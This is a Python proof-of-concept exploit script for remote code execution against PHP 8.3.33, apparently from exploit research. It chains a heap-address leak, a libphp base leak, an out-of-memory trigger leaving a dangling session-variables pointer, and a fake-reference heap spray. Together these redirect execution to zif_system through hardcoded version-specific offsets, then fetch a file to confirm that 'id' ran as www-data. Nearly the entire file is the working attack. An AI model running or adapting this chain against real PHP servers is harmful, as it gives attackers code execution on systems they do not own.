#!/usr/bin/env python3
"""php2shell PoC — PHP 8.3.33 (p2s8333, port 18124).  RCE PROVEN (uid=33 www-data).

Chain (same 8.3 family as 8.3.35):
  stage-1  exploit.py heap leak  -> chunk base
  stage-2  exploit.py libphp leak -> libphp base (zif = libphp + 0x3abf80)
  stage-3  9bie spray:
            A2  cheap_oom_a.py  -> dangling PS(http_session_vars)
            B2  fake_ref_b.py   -> 384B fake-ref spray, fake-array at S = chunk + S_OFF
            S_OFF = 0xF6398  (8.3.x heap layout; no HEAP_PROTECTION)

Usage:
    python poc/poc_8333.py
"""
import sys, os, time, subprocess

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import exploit

VER = "8.3.33"
PORT = 18124
CONTAINER = "p2s8333"
ZIF = 0x3abf80          # zif_system offset in libphp (8.3.33)
DTOR = 0x49e650         # zval_ptr_dtor offset (8.3.33)
HTDATA = 0x690d8        # HTDATA (bookworm)
S_OFF = 0xF6398         # fake-array (ht field) offset from chunk base — 8.3.x calibration
CMD = "id>/www/p1"
FETCH = "/p1"

GH = r"C:\Users\likat\.qwen\tmp\p2s"
TMP = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tmp_8333")


def run9(script, args, timeout=180):
    cmd = [sys.executable, os.path.join(GH, f"gh_pure_{script}")] + args
    subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def main():
    os.makedirs(TMP, exist_ok=True)
    t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=30, verbose=False)
    ex = exploit.Exploit(t, CMD, zif_offset=ZIF, dtor_offset=DTOR,
                         htdata_offset=HTDATA, huge_mb=256, verbose=False,
                         profile="bookworm")

    t0 = time.time()
    for attempt in range(1, 6):
        ex.rotate()
        chunk = 0
        for _ in range(4):
            ex.rotate(); chunk = ex.stage1()
            if chunk: break
        if not chunk:
            print(f"  [attempt {attempt}] stage1 failed", flush=True); continue
        libphp = 0
        for _ in range(4):
            ex.rotate(); libphp = ex.stage2()
            if libphp: break
        if not libphp:
            print(f"  [attempt {attempt}] stage2 failed", flush=True); continue
        zif = libphp + ZIF
        S = chunk + S_OFF
        print(f"  [attempt {attempt}] chunk=0x{chunk:x} libphp=0x{libphp:x} "
              f"zif=0x{zif:x} S=0x{S:x}", flush=True)

        ht_file = os.path.join(TMP, "ht_s.bin")
        run9("mk_ht.py", [hex(S), hex(zif), CMD, ht_file], timeout=30)
        if not os.path.exists(ht_file):
            print(f"  [attempt {attempt}] mk_ht failed", flush=True); continue
        # A2: cheap OOM -> dangling PS(http_session_vars)
        run9("cheap_oom_a.py", ["--port", str(PORT), "--parts", "880",
                                "--depth", "64", "--fillers", "115"], timeout=120)
        time.sleep(0.3)
        # B2: fake-ref spray covering the dangling slot, fake-array at S
        run9("fake_ref_b.py", ["--port", str(PORT), "--vl", "384",
                               "--n1", "500", "--n2", "495", "--rc", "1",
                               "--ht-addr", hex(S), "--ht-file", ht_file], timeout=120)
        time.sleep(0.8)
        status, body = t.get(FETCH)
        hit = (status == 200 and b"uid=" in body)
        print(f"  [attempt {attempt}] -> {'HIT' if hit else 'miss'} ({status})", flush=True)
        if hit:
            print(f"[+] RCE PROVEN  {VER}  ({time.time()-t0:.1f}s)", flush=True)
            print(f"    {body.decode('latin1').strip()}", flush=True)
            return 0
    print(f"[-] FAILED  {VER}  ({time.time()-t0:.1f}s)  blocker: stage-3 (spray alignment)", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
